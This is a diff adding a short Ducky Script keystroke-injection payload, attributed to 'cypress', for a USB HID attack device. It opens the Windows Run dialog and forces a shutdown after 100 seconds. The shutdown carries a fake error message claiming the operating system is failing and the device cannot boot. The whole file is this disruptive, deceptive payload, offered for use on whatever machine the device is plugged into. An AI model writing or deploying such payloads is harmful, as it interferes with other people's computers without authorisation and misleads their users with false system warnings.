@@ -1,0 +1,7 @@
+REM shutdown pc with method
+REM by: cypress
+GUI r
+DELAY 200
+STRING cmd /c shutdown -t 100 -c "Error! There is a problem with your Operating System and this device is failing to boot back up. Powering down in 100 seconds.."-s
+DELAY 100
+ENTER
